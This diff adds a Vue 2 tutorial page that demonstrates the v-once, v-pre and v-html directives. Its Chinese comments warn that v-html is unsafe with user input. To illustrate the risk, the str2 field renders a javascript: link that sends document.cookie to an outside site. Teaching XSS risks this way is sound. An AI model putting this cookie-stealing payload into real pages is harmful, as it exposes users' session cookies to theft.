@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<div id="root">
+    <div v-once>初始的name是{{name}}</div>
+  <div>你好{{name}}</div>
+  <div v-pre v-html="str"></div>
+  <div v-html="str2"></div>
+    <button @click="changeName">改变名字</button>
+</div>
+
+<script src="https://cdn.staticfile.org/vue/2.2.2/vue.min.js"></script>
+<script>
+  new Vue({
+    el:'#root',
+    data:{
+      name:'尚硅谷',
+      str:'<h3>你好</h3>',
+      str2:'<a href=javascript:location.href="http://www.bilibili.com/?"+document.cookie>来啊</a>',
+
+
+    },
+      methods:{
+        changeName(){
+            this.name='黑马';
+
+        }
+
+
+      }
+
+
+  })
+  //注意！！！v-html并不安全 一定要在可信的地方用 不要在用户提交上使用
+    //v-once 让元素只加载一次 而 v-pre是让Vue无视元素
+</script>
+
+</body>
+</html>
